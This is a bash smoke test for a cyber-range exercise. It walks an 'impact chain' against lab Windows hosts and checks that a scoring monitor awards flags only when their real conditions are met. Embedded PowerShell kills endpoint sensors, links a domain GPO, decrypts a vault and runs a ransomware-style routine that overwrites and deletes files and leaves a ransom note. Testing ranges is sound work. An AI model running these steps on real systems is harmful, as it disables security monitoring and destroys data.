#!/usr/bin/env bash
# smoke_m10_impact_chain.sh -- standalone M10 smoke (impact / detonation chain).
# Walks the whole M10 chain against the live range and asserts that the impact
# monitor on teamcity.alpha scores each objective ONLY when its real
# precondition holds. Exercises:
#
#   [M10.s1]  recovery token recovered from the VSS shadow copy on dc1.alpha
#   [M10.s2]  POST /maintenance + fleet-wide sensor silence -> UUID released
#   [M10.s3]  new applied GPO + surviving deploy artifact    -> UUID released
#   [M10.s4]  14 host segments + the gated final segment     -> objective row
#   [M10.s5]  canary detonation on ws.alpha                  -> UUID released
#
#   [M10_NEGATIVE_LIVE_PLAN]     the LIVE recovery-plan.txt must NOT carry the
#                                token -- if it does, the shadow-copy gate is a
#                                no-op and m10.s1 is free.
#   [M10_NEGATIVE_BAD_TOKEN]     POST /maintenance with a wrong token MUST 403
#                                and MUST NOT open the maintenance window.
#   [M10_NEGATIVE_SEGMENT_GATE]  GET /vault/final-segment MUST 403 until m10.s3
#                                is released, else m10.s4 is capturable without
#                                the deployment step.
#   [M10_NEGATIVE_GPO_HANDDROP]  dropping the deploy artifact by hand, with no
#                                new applied GPO, MUST NOT release m10.s3.
#
# The four NEGATIVE checks are the point of this script: every M10 objective is
# scored by the monitor from host reports, so a scoring bug shows up as a flag
# released for free rather than as a visible error.
#
# DESTRUCTIVE. It silences the fleet sensors, links a real GPO in alpha.local,
# and rewrites the ws.alpha canary fileset. Snapshot first and revert after:
#     make snapshot-all SNAP_NAME=clean-eval-m10
#     bash scripts/smoke_m10_impact_chain.sh --yes
#     make revert-all   SNAP_NAME=clean-eval-m10
#
# --nondestructive runs only the read-only checks (m10.s1 recovery and the
# three gate negatives) and changes nothing; it is safe on a baked baseline.
#
# Usage:
#   bash smoke_m10_impact_chain.sh [--yes] [--nondestructive]
#       [--monitor 10.40.0.21:8099] [--manifest /path] [--logdir DIR]
#       [--poll-timeout 600] [--wait-ready 300]
#
# Exit codes: 0 PASS / 1 FAIL / 2 USAGE

set -uo pipefail

REPO="$(cd "$(dirname "$0")/.." && pwd)"
ANSIBLE="$REPO/.venv/bin/ansible"
PY="$REPO/.venv/bin/python3"
MONITOR="10.40.0.21:8099"
MANIFEST="$REPO/flags/manifest.yaml"
LOGDIR="/tmp/smoke-m10-$$"
POLL_TIMEOUT=600
WAIT_READY=300
NONDESTRUCTIVE=0
YES=0

DC="dc1.alpha"
MEMBER="secrets.alpha"
CANARY="ws.alpha"
FLEET=("dc1.alpha" "secrets.alpha" "ws.alpha")
DEPLOY_DIR='C:\ProgramData\Nilgiri\deploy'
GPO_NAME="M10-Smoke-Deploy"

while [ $# -gt 0 ]; do
    case "$1" in
        --monitor)        MONITOR="$2"; shift 2 ;;
        --manifest)       MANIFEST="$2"; shift 2 ;;
        --logdir)         LOGDIR="$2"; shift 2 ;;
        --poll-timeout)   POLL_TIMEOUT="$2"; shift 2 ;;
        --wait-ready)     WAIT_READY="$2"; shift 2 ;;
        --nondestructive) NONDESTRUCTIVE=1; shift ;;
        --yes)            YES=1; shift ;;
        -h|--help)        sed -n '2,46p' "$0"; exit 0 ;;
        *) echo "unknown arg: $1"; exit 2 ;;
    esac
done

mkdir -p "$LOGDIR"
PASS=0; FAIL=0

c_red()   { printf '\033[31m%s\033[0m' "$*"; }
c_green() { printf '\033[32m%s\033[0m' "$*"; }
c_blue()  { printf '\033[34m%s\033[0m' "$*"; }
c_yellow(){ printf '\033[33m%s\033[0m' "$*"; }
section() { echo; echo "============================================================"; echo " [$(c_blue "$1")] $2"; echo "============================================================"; }
ok()   { echo "  $(c_green ok): $*";     PASS=$((PASS+1)); }
bad()  { echo "  $(c_red FAIL): $*";     FAIL=$((FAIL+1)); }
note() { echo "  $(c_yellow note): $*"; }

[ -x "$ANSIBLE" ] || { echo "ansible not found at $ANSIBLE -- run from the repo with .venv present"; exit 2; }

manifest_uuid() {
    "$PY" - "$MANIFEST" "$1" <<'PY'
import sys, yaml
doc = yaml.safe_load(open(sys.argv[1]))
entries = doc if isinstance(doc, list) else (doc.get("flags") or [])
for e in entries:
    if isinstance(e, dict) and e.get("id") == sys.argv[2]:
        print(e["uuid"]); break
PY
}

# --- host exec helpers ----------------------------------------------------
# Ad-hoc win_shell through the repo venv. The SYSTEM variant is needed wherever
# the range ACLs exclude the account we connect as (the vault is Domain Admins
# only and we reach secrets.alpha as its LOCAL Administrator; the sensor tasks
# are SYSTEM-only by design).
# Scripts go over as -EncodedCommand. ad-hoc `-a` is win_shell free-form, which
# is split with a shlex-style parser: multi-line bodies get mangled and a lone
# backslash-before-quote (e.g. 'C:\') reads as an escaped quote. Base64 of
# UTF-16LE makes every script a single opaque token.
# $ProgressPreference is forced off: module autoload writes "Preparing modules
# for first use" progress records that come back as CLIXML on stdout and
# corrupt any value the caller tries to parse.
_ps_b64() {
    printf '$ProgressPreference = "SilentlyContinue"\n%s' "$1" | "$PY" -c \
        'import sys,base64; sys.stdout.write(base64.b64encode(sys.stdin.buffer.read().decode("utf-8").encode("utf-16-le")).decode())'
}
_run() {
    local host="$1" ps="$2" sys="${3:-}" out cmd
    cmd="powershell.exe -NoProfile -NonInteractive -EncodedCommand $(_ps_b64 "$ps")"
    if [ -n "$sys" ]; then
        out="$("$ANSIBLE" "$host" -m ansible.windows.win_shell -a "$cmd" \
              --become --become-method runas --become-user SYSTEM 2>&1)"
    else
        out="$("$ANSIBLE" "$host" -m ansible.windows.win_shell -a "$cmd" 2>&1)"
    fi
    printf '%s\n' "$out" >>"$LOGDIR/host.log"
    grep -qE '\| (CHANGED|SUCCESS) \|' <<<"$out" || { printf '%s\n' "$out"; return 1; }
    sed '1d' <<<"$out"
}
win()     { _run "$1" "$2" ""; }
win_sys() { _run "$1" "$2" "sys"; }

# --- monitor helpers ------------------------------------------------------
mon_get()  { curl -sS --max-time 20 "http://$MONITOR$1"; }
mon_code() { curl -sS -o /dev/null -w '%{http_code}' --max-time 20 "http://$MONITOR$1"; }
mon_post() {
    curl -sS -o "$LOGDIR/post.out" -w '%{http_code}' --max-time 20 \
         -H 'Content-Type: application/json' -d "$2" "http://$MONITOR$1"
}
released_uuid() {
    mon_get /status | "$PY" -c \
        "import json,sys; print((json.load(sys.stdin).get('released') or {}).get('$1',''))" 2>/dev/null
}
poll_release() {
    local flag="$1" timeout="${2:-$POLL_TIMEOUT}" waited=0 got=""
    while [ "$waited" -lt "$timeout" ]; do
        got="$(released_uuid "$flag")"
        [ -n "$got" ] && { printf '%s' "$got"; return 0; }
        sleep 15; waited=$((waited+15))
        printf '    ... waiting for %s (%ss/%ss)\n' "$flag" "$waited" "$timeout" >&2
    done
    return 1
}

S1="$(manifest_uuid m10.s1)"; S2="$(manifest_uuid m10.s2)"
S3="$(manifest_uuid m10.s3)"; S4="$(manifest_uuid m10.s4)"
S5="$(manifest_uuid m10.s5)"; M9S4="$(manifest_uuid m9.s4)"
for v in S1 S2 S3 S4 S5 M9S4; do
    [ -n "${!v}" ] || { echo "could not resolve a UUID from $MANIFEST ($v)"; exit 2; }
done

# =========================================================================
section "PREFLIGHT" "monitor reachable and the fleet is reporting"
# =========================================================================
if [ "$(mon_code /status)" = "200" ]; then
    ok "impact monitor answering on $MONITOR"
else
    bad "impact monitor not answering on $MONITOR -- is M10 provisioned (make m10)?"
    echo; echo "PASS=$PASS FAIL=$FAIL"; exit 1
fi

# WinRM readiness FIRST. `make revert-all --running` returns as soon as the
# domains start, but the DC takes appreciably longer to accept WinRM than the
# members -- running straight after a revert otherwise fails every dc1.alpha
# command and this script would score those as security failures.
waited=0
while :; do
    down=""
    for h in "${FLEET[@]}"; do
        "$ANSIBLE" "$h" -m win_ping >/dev/null 2>&1 || down="$down $h"
    done
    [ -z "$down" ] && break
    [ "$waited" -ge "$WAIT_READY" ] && break
    printf '    ... waiting for WinRM on%s (%ss/%ss)\n' "$down" "$waited" "$WAIT_READY"
    sleep 15; waited=$((waited+15))
done
if [ -z "$down" ]; then
    ok "all fleet hosts accepting WinRM"
else
    bad "fleet hosts unreachable after ${WAIT_READY}s:$down -- aborting (results would be meaningless)"
    echo; echo "PASS=$PASS FAIL=$FAIL"; exit 1
fi

# Heartbeat recency, not just "ever seen": a host whose sensor was already
# killed by an earlier partial run would otherwise sail through preflight and
# fail confusingly later.
stale="$(mon_get /status | "$PY" -c 'import json,sys
d = json.load(sys.stdin)
seen = d.get("fleet_last_seen") or {}
print(",".join("%s(%s)" % (h, v) for h, v in seen.items() if v is None or v > 180))')"
if [ -z "$stale" ]; then
    ok "all fleet hosts heartbeating recently"
else
    bad "stale/absent heartbeats: $stale -- the range is not pristine (revert to a clean snapshot first)"
    echo; echo "PASS=$PASS FAIL=$FAIL"; exit 1
fi

# =========================================================================
section "M10.s1" "recovery token lives ONLY in the shadow copy (dc1.alpha)"
# =========================================================================
# NB: distinguish "the check ran and failed" from "the check could not run".
# Treating an exec failure as a verdict here would report a token leak that
# does not exist.
if ! live="$(win "$DC" "if (Select-String -LiteralPath 'C:\\BackupOps\\recovery-plan.txt' -SimpleMatch '$S1' -Quiet) { 'PLAN=LEAKED' } else { 'PLAN=redacted' }")"; then
    bad "[M10_NEGATIVE_LIVE_PLAN] could not run the check on $DC -- no verdict"
elif [[ "$live" == *PLAN=redacted* ]]; then
    ok "[M10_NEGATIVE_LIVE_PLAN] live recovery-plan.txt does not carry the token"
elif [[ "$live" == *PLAN=LEAKED* ]]; then
    bad "[M10_NEGATIVE_LIVE_PLAN] the LIVE plan contains the m10.s1 token -- shadow-copy gate is a no-op"
else
    bad "[M10_NEGATIVE_LIVE_PLAN] unparseable result from $DC -- no verdict"
fi

read -r -d '' PS_SHADOW <<'PS'
$ErrorActionPreference = 'Stop'
$link = 'C:\m10smoke-shadow'
if (Test-Path $link) { cmd /c rmdir $link | Out-Null }
$found = ''
foreach ($sc in (Get-CimInstance Win32_ShadowCopy | Sort-Object InstallDate -Descending)) {
    cmd /c mklink /d $link ($sc.DeviceObject + '\') | Out-Null
    $p = Join-Path $link 'BackupOps\recovery-plan.txt'
    if (Test-Path $p) {
        $m = [regex]::Match((Get-Content -Raw $p), 'recovery-token:\s*([0-9a-fA-F-]{36})')
        if ($m.Success) { $found = $m.Groups[1].Value }
    }
    cmd /c rmdir $link | Out-Null
    if ($found) { break }
}
if ($found) { "TOKEN=$found" } else { 'TOKEN=none' }
PS
if ! shadow_out="$(win "$DC" "$PS_SHADOW")"; then
    bad "[M10.s1] could not run shadow-copy recovery on $DC -- no verdict"
    token=""
else
    token="$(printf '%s' "$shadow_out" | tr -d '\r' | grep -o 'TOKEN=[0-9a-fA-F-]*' | tail -1)"
    token="${token#TOKEN=}"
    if [ "$token" = "$S1" ]; then
        ok "[M10.s1] recovered the token from a shadow copy and it matches the manifest"
    elif [ -z "$token" ]; then
        bad "[M10.s1] no recovery token found in any shadow copy on $DC"
    else
        bad "[M10.s1] shadow-copy recovery returned '$token' (expected $S1)"
    fi
fi

# =========================================================================
section "GATE NEGATIVES" "checks that must hold BEFORE the chain is walked"
# =========================================================================
code="$(mon_post /maintenance '{"token":"00000000-0000-0000-0000-000000000000"}')"
if [ "$code" = "403" ]; then ok "[M10_NEGATIVE_BAD_TOKEN] wrong recovery token rejected (403)"
else bad "[M10_NEGATIVE_BAD_TOKEN] wrong token returned HTTP $code (expected 403)"; fi

auth="$(mon_get /maintenance | "$PY" -c 'import json,sys; print(json.load(sys.stdin).get("authorised"))' 2>/dev/null)"
if [ "$auth" = "False" ]; then ok "[M10_NEGATIVE_BAD_TOKEN] maintenance window still closed after the bad token"
else note "maintenance window already open (authorised=$auth) -- range is mid-chain, not pristine"; fi

code="$(mon_code /vault/final-segment)"
if [ "$(released_uuid m10.s3)" = "" ] && [ "$code" = "403" ]; then
    ok "[M10_NEGATIVE_SEGMENT_GATE] final vault segment withheld until m10.s3 (403)"
elif [ "$(released_uuid m10.s3)" != "" ]; then
    note "m10.s3 already released -- segment gate cannot be tested on a dirty range"
else
    bad "[M10_NEGATIVE_SEGMENT_GATE] final segment served HTTP $code with m10.s3 unreleased"
fi

if [ "$NONDESTRUCTIVE" = "1" ]; then
    echo; echo "------------------------------------------------------------"
    echo " non-destructive subset only -- PASS=$PASS FAIL=$FAIL"
    echo " re-run with --yes to walk the full destructive chain"
    echo "------------------------------------------------------------"
    [ "$FAIL" -eq 0 ] || exit 1
    exit 0
fi

if [ "$YES" != "1" ]; then
    echo
    echo "This walks the DESTRUCTIVE chain: it silences the fleet sensors, links a"
    echo "GPO in alpha.local, and rewrites the ws.alpha canary fileset."
    echo "Snapshot first, then re-run with --yes. Aborting."
    exit 2
fi

# =========================================================================
section "M10.s2" "maintenance window + fleet-wide sensor silence"
# =========================================================================
code="$(mon_post /maintenance "{\"token\":\"$token\"}")"
if [ "$code" = "200" ]; then ok "POST /maintenance accepted the recovered token"
else bad "POST /maintenance returned HTTP $code with the recovered token"; fi

# ONLY the sensor and its watchdog. The reporter must stay alive: the sensor
# POSTs /heartbeat (what this objective's silence is measured from) but the
# REPORTER POSTs /report, which is the only source of the gpo_applied,
# deploy_files and canary data that m10.s3 and m10.s5 are scored from. Killing
# the reporter too freezes those reports at their pre-attack values and makes
# the rest of the chain unscoreable -- see the note in the summary.
read -r -d '' PS_SILENCE <<'PS'
$ErrorActionPreference = 'SilentlyContinue'
foreach ($t in @('NilgiriEndpointSensor','NilgiriSensorWatchdog')) {
    Stop-ScheduledTask -TaskName $t
    Unregister-ScheduledTask -TaskName $t -Confirm:$false
}
$left = @(Get-ScheduledTask | Where-Object {
    $_.TaskName -match 'Nilgiri' -and $_.TaskName -notmatch 'Reporter'
}).Count
$rep = @(Get-ScheduledTask | Where-Object { $_.TaskName -match 'Reporter' }).Count
"tasks_remaining=$left reporter=$rep"
PS
for h in "${FLEET[@]}"; do
    if ! out="$(win_sys "$h" "$PS_SILENCE")"; then
        bad "could not run the silence step on $h -- no verdict"
        continue
    fi
    r="$(printf '%s' "$out" | tr -d '\r' | grep -o 'tasks_remaining=[0-9]* reporter=[0-9]*' | tail -1)"
    if [ "$r" = "tasks_remaining=0 reporter=1" ]; then ok "sensor + watchdog removed on $h, reporter still up"
    elif [[ "$r" == "tasks_remaining=0"* ]]; then bad "sensor removed on $h but the reporter is gone ($r) -- m10.s3/s5 cannot be scored"
    else bad "sensor stack still present on $h ($r)"; fi
done

note "waiting for the monitor to see all three hosts silent (>=180s together)"
if got="$(poll_release m10.s2)"; then
    if [ "$got" = "$S2" ]; then ok "[M10.s2] released and matches the manifest UUID"
    else bad "[M10.s2] released '$got' but the manifest says $S2"; fi
else
    bad "[M10.s2] not released within ${POLL_TIMEOUT}s -- see: curl http://$MONITOR/status"
fi

# =========================================================================
section "M10.s3" "new applied GPO + surviving deploy artifact"
# =========================================================================
# NEGATIVE first: with the sensors dead the artifact now survives, but with no
# NEW applied GPO the monitor must still refuse to score.
for h in "$DC" "$MEMBER"; do
    win "$h" "New-Item -ItemType Directory -Force -Path '$DEPLOY_DIR' | Out-Null; Set-Content -LiteralPath '$DEPLOY_DIR\\payload.txt' -Value 'm10-smoke-handdrop'; 'dropped'" >/dev/null
done
note "hand-dropped the artifact with no GPO; waiting 60s for a report cycle"
sleep 60
if [ "$(released_uuid m10.s3)" = "" ]; then
    ok "[M10_NEGATIVE_GPO_HANDDROP] artifact alone did not release m10.s3"
else
    bad "[M10_NEGATIVE_GPO_HANDDROP] m10.s3 released from a hand-dropped file with no new GPO"
fi

# The link check is deliberately written as a counted array. `-not (expr).X |
# Where-Object {...}` binds -not to the property access and pipes a BOOLEAN
# into Where-Object, which yields nothing, so the if never fires and New-GPLink
# is silently skipped -- the GPO gets created but never linked, and every
# downstream step then waits on a policy that can never apply.
read -r -d '' PS_GPO <<PS
\$ErrorActionPreference = 'Stop'
Import-Module GroupPolicy
Import-Module ActiveDirectory
\$name = '$GPO_NAME'
\$g = Get-GPO -Name \$name -ErrorAction SilentlyContinue
if (-not \$g) { \$g = New-GPO -Name \$name -Comment 'M10 smoke test' }
\$dn = (Get-ADDomain).DistinguishedName
\$linked = @((Get-GPInheritance -Target \$dn).GpoLinks | Where-Object { \$_.DisplayName -eq \$name })
if (\$linked.Count -eq 0) { New-GPLink -Name \$name -Target \$dn -LinkEnabled Yes | Out-Null }
Set-GPRegistryValue -Name \$name -Key 'HKLM\\Software\\Nilgiri\\M10Smoke' -ValueName 'Deployed' -Type String -Value 'yes' | Out-Null
\$now = @((Get-GPInheritance -Target \$dn).GpoLinks | Where-Object { \$_.DisplayName -eq \$name })
if (\$now.Count -ge 1) { 'GPO=linked' } else { 'GPO=NOTLINKED' }
PS
if ! gres="$(win "$DC" "$PS_GPO")"; then
    bad "could not create/link the GPO on $DC -- no verdict"
elif [[ "$gres" == *GPO=linked* ]]; then
    ok "GPO '$GPO_NAME' created and linked at the domain root"
else
    bad "GPO '$GPO_NAME' exists but is NOT linked at the domain root"
fi

# Verify the policy actually APPLIED, rather than trusting that gpupdate ran.
# Without this a non-applying GPO only shows up as a 600s poll timeout with no
# indication of why.
read -r -d '' PS_GPUPDATE <<'PS'
$ErrorActionPreference = 'SilentlyContinue'
for ($i = 0; $i -lt 3; $i++) {
    & gpupdate.exe /force | Out-Null
    if (Test-Path 'HKLM:\Software\Nilgiri\M10Smoke') { break }
    Start-Sleep -Seconds 20
}
"APPLIED=" + (Test-Path 'HKLM:\Software\Nilgiri\M10Smoke')
PS
for h in "$DC" "$MEMBER"; do
    if ! r="$(win "$h" "$PS_GPUPDATE")"; then
        bad "gpupdate failed on $h -- no verdict"
    elif [[ "$r" == *APPLIED=True* ]]; then
        ok "GPO applied on $h (policy registry key present)"
    else
        bad "GPO did NOT apply on $h -- m10.s3 cannot be scored"
    fi
    # re-drop: a live sensor may have deleted it, and the artifact must be
    # present in the SAME report that shows the new GPO.
    win "$h" "New-Item -ItemType Directory -Force -Path '$DEPLOY_DIR' | Out-Null; Set-Content -LiteralPath '$DEPLOY_DIR\\payload.txt' -Value 'm10-smoke'; 'dropped'" >/dev/null
done

if got="$(poll_release m10.s3)"; then
    if [ "$got" = "$S3" ]; then ok "[M10.s3] released and matches the manifest UUID"
    else bad "[M10.s3] released '$got' but the manifest says $S3"; fi
else
    bad "[M10.s3] not released within ${POLL_TIMEOUT}s -- check 'gpo_applied' in the host reports"
fi

# =========================================================================
section "M10.s4" "reassemble the records vault and recover the objective row"
# =========================================================================
code="$(mon_code /vault/final-segment)"
if [ "$code" = "200" ]; then ok "final vault segment released now that m10.s3 holds"
else bad "final segment returned HTTP $code after m10.s3 (expected 200)"; fi
curl -sS --max-time 30 "http://$MONITOR/vault/final-segment" -o "$LOGDIR/final.seg"

# The segments are Domain-Admins-only and we reach secrets.alpha as its LOCAL
# Administrator, so concatenate as SYSTEM into a readable temp file.
read -r -d '' PS_VAULT <<'PS'
$ErrorActionPreference = 'Stop'
$out = 'C:\Windows\Temp\m10smoke-vault.bin'
if (Test-Path $out) { Remove-Item $out -Force }
$fs = [IO.File]::Create($out)
Get-ChildItem 'C:\RecordsVault' -File | Sort-Object Name | ForEach-Object {
    $b = [IO.File]::ReadAllBytes($_.FullName); $fs.Write($b, 0, $b.Length)
}
$fs.Close()
icacls $out /grant 'BUILTIN\Administrators:(R)' | Out-Null
"bytes=" + (Get-Item $out).Length
PS
vb="$(win_sys "$MEMBER" "$PS_VAULT" | tr -d '\r' | grep -o 'bytes=[0-9]*' | tail -1)"
if [ -n "$vb" ]; then ok "host segments concatenated on $MEMBER ($vb)"; else bad "could not concatenate host segments on $MEMBER"; fi

"$ANSIBLE" "$MEMBER" -m ansible.builtin.fetch \
    -a "src=C:\\Windows\\Temp\\m10smoke-vault.bin dest=$LOGDIR/hostparts.bin flat=yes" \
    >>"$LOGDIR/host.log" 2>&1 \
    && ok "pulled the host segments to $LOGDIR" \
    || bad "could not fetch the concatenated segments"
win_sys "$MEMBER" "Remove-Item -LiteralPath 'C:\\Windows\\Temp\\m10smoke-vault.bin' -Force -ErrorAction SilentlyContinue; 'cleaned'" >/dev/null

cat "$LOGDIR/hostparts.bin" "$LOGDIR/final.seg" > "$LOGDIR/vault.bin" 2>/dev/null
row="$("$PY" - "$LOGDIR/vault.bin" "$M9S4" <<'PY'
import sys, hashlib, gzip
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
blob = open(sys.argv[1], "rb").read()
key = hashlib.sha256(sys.argv[2].encode("ascii")).digest()
iv, ct = blob[:16], blob[16:]
ct = ct[: len(ct) - (len(ct) % 16)]
d = Cipher(algorithms.AES(key), modes.CBC(iv)).decryptor()
pt = d.update(ct) + d.finalize()
pt = pt[: -pt[-1]] if pt and 1 <= pt[-1] <= 16 else pt
try:
    print(gzip.decompress(pt).decode("utf-8", "replace").strip().splitlines()[-1])
except Exception as exc:  # noqa: BLE001 -- surfaced as a FAIL below
    print("DECRYPT-FAILED: %s" % exc)
PY
)"
if [[ "$row" == *"$S4"* ]]; then
    ok "[M10.s4] objective row recovered from the reassembled vault"
else
    bad "[M10.s4] objective row not recovered (got: ${row:0:90})"
fi

code="$(mon_post /staging-complete "{\"token\":\"$S4\"}")"
if [ "$code" = "200" ]; then ok "POST /staging-complete armed detonation scoring"
else bad "POST /staging-complete returned HTTP $code"; fi

# =========================================================================
section "M10.s5" "canary detonation on ws.alpha"
# =========================================================================
# >=90% of the baseline files must change, >=90% of the payload must be
# high-entropy under one NEW extension, and a low-entropy ransom note must
# appear. Random bytes give ~8.0 bits/byte, comfortably over the 7.0 floor.
read -r -d '' PS_DETONATE <<'PS'
$ErrorActionPreference = 'Stop'
$root = 'C:\CanaryShare'
$rng = [Security.Cryptography.RandomNumberGenerator]::Create()
$n = 0
foreach ($f in (Get-ChildItem $root -Recurse -File)) {
    $len = [Math]::Max(2048, [int]$f.Length)
    $buf = New-Object byte[] $len
    $rng.GetBytes($buf)
    [IO.File]::WriteAllBytes($f.FullName + '.nlgr', $buf)
    Remove-Item -LiteralPath $f.FullName -Force
    $n++
}
Set-Content -LiteralPath (Join-Path $root 'READ_ME_RECOVER.txt') -Value @'
Your files have been encrypted.
To recover them you need the decryption key held by the operator.
Contact the address in this note to restore your data.
'@
"encrypted=$n"
PS
r="$(win_sys "$CANARY" "$PS_DETONATE" | tr -d '\r' | grep -o 'encrypted=[0-9]*' | tail -1)"
if [ -n "$r" ]; then ok "canary fileset rewritten on $CANARY ($r) + ransom note"
else bad "detonation step failed on $CANARY"; fi

if got="$(poll_release m10.s5)"; then
    if [ "$got" = "$S5" ]; then ok "[M10.s5] released and matches the manifest UUID"
    else bad "[M10.s5] released '$got' but the manifest says $S5"; fi
else
    bad "[M10.s5] not released within ${POLL_TIMEOUT}s -- check the canary block of /status"
fi

# =========================================================================
echo
echo "============================================================"
mon_get /status > "$LOGDIR/status-final.json" 2>/dev/null
echo " final monitor status saved to $LOGDIR/status-final.json"
echo " host command log:               $LOGDIR/host.log"
if [ "$FAIL" -eq 0 ]; then
    echo " $(c_green "M10 CHAIN PASS") -- $PASS checks"
else
    echo " $(c_red "M10 CHAIN FAIL") -- $PASS passed, $FAIL failed"
fi
echo
echo " the range is now detonated -- restore with:"
echo "     make revert-all SNAP_NAME=clean-eval-m10"
echo "============================================================"
[ "$FAIL" -eq 0 ] || exit 1
exit 0
